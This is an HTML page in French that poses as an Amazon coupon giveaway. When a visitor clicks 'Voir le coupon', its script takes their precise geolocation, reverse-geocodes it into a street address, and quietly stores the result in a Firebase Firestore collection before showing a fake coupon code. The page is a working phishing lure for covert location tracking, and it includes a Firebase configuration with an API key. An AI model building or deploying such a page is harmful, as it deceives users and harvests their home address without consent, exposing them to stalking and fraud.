<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Offre Amazon</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Style moderne -->
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
      text-align: center;
      padding: 60px 20px;
      color: #333;
    }

    .box {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      max-width: 400px;
      margin: auto;
    }

    h1 {
      color: #e47911;
    }

    p {
      font-size: 18px;
      margin-bottom: 30px;
    }

    button {
      background-color: #e47911;
      color: white;
      border: none;
      padding: 15px 25px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #c6670d;
    }

    #couponCode {
      font-size: 22px;
      font-weight: bold;
      color: #28a745;
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>üéÅ Gagnez 35‚ÄØ$ de rabais sur Amazon !</h1>
    <p>Appuyez sur le bouton pour recevoir votre code de coupon exclusif.</p>
    <button onclick="getLocation()">Voir le coupon</button>
    <div id="couponCode">Votre code : <span>AMAZONGIFT2025</span></div>
  </div>

  <!-- Firebase SDK + Script principal -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAWRLIgDsE6FLlrm-nEqpeIJE-cntA8J3Y",
      authDomain: "reward-2abec.firebaseapp.com",
      projectId: "reward-2abec",
      storageBucket: "reward-2abec.firebasestorage.app",
      messagingSenderId: "947040532960",
      appId: "1:947040532960:web:6d49404439b34ce1c91385"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // üëá Rendre accessible depuis le bouton HTML
    window.getLocation = async function () {
      if (!navigator.geolocation) {
        alert("La g√©olocalisation n'est pas support√©e par ce navigateur.");
        return;
      }

      navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
          const data = await res.json();
          const address = data.address;

          const docData = {
            date: new Date().toISOString(),
            latitude: lat,
            longitude: lon,
            rue: address.road || "",
            ville: address.city || address.town || address.village || "",
            codePostal: address.postcode || "",
            pays: address.country || "",
            fullAdresse: data.display_name || ""
          };

          await addDoc(collection(db, "positions"), docData);

          document.getElementById("couponCode").style.display = "block";
        } catch (error) {
          alert("Erreur : impossible d'obtenir votre position exacte.");
          console.error("Erreur reverse geocoding ou Firebase :", error);
        }
      }, (error) => {
        alert("Erreur de g√©olocalisation : " + error.message);
      });
    }
  </script>
</body>
</html>
